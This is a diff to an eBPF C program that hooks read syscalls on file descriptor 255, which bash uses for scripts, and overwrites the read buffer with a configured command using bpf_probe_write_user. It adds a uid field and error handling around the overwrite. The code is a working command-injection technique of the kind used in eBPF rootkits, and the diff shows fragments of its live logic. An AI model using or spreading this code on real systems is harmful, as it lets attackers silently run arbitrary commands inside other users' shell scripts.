@@ -3,11 +3,13 @@
 #include <bpf/bpf_core_read.h>
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
-#include "utils.h"
+#include "common.h"
+#include "bash.h"
 
 char LICENSE[] SEC("license") = "GPL";
 
 struct event {
+    u32 uid;
     u32 pid;
     char cmdline[128];
     u32 len_cmdline;
@@ -37,7 +39,7 @@ struct {
 
 // returns 0 if really handled
 static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
-    // sys_read(unsigned int fd, char *buf, size_t count)
+    // ssize_t read(int fd, void buf[.count], size_t count);
     struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
     int fd = (int)PT_REGS_PARM1_CORE(regs);
     // filter fd==255
@@ -70,7 +72,10 @@ static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
     // TODO: what if count < new_len_with_null?
     if (count > len_command) {
         // TODO: insert/append instead of overwrite
-        bpf_probe_write_user(buf, cfg->command, len_command);
+        long ret = bpf_probe_write_user(buf, cfg->command, len_command);
+        if (ret != 0) {
+            return 1;
+        }
         injected = true;
     }
     // send event to user space
@@ -79,6 +84,7 @@ static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
     if (!e) {
         return 1;
     }
+    e->uid = bpf_get_current_uid_gid();
     e->len_cmdline = get_cmdline(e->cmdline, sizeof(e->cmdline));
     e->pid = bpf_get_current_pid_tgid() >> 32;
     e->injected = injected;
